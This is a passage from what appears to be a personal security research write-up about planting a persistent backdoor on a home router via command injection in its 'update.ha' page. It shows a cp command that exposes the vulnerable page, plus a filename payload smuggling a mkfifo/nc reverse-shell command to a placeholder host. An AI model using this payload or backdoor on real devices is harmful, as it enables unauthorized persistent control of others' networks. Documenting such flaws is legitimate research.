...
```
Assuming I could set up a way to access this page, this seemed like an extremely simple way to get persistence. 

## The game plan
This command injection gives us two methods to create a very low-profile, easy-to-implement backdoor that, depending on which strategy is used, can even persist across firmware updates. 
<br><br>
<b>Method 1: </b> Copy or link the vulnerable `update.ha` page into the `/www/att` directory <br>
<b>Method 2: </b> Change the configuration so that it serves the `/www/wificert` pages. This appears to happen via TR-069 configuration, but I wasn't able to figure it out over winter break. 
...
## Persistence 
After we get our shell, we can simply `cp /www/wificert/cgi-bin/update.ha /www/att/cgi-bin/update.ha`, or something a little more sneaky if you prefer. This is all we need to do over the serial shell, and the wires can now be disconnected. To use my backdoor, since I'm too lazy to figure out file uploads with `curl`, I intercepted the update packet in burp, and changed the filename to `;mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc <IP> <PORT> 1>/tmp/b`. After getting my listener set up, I was finally able to get a persistent, solder-free shell. 
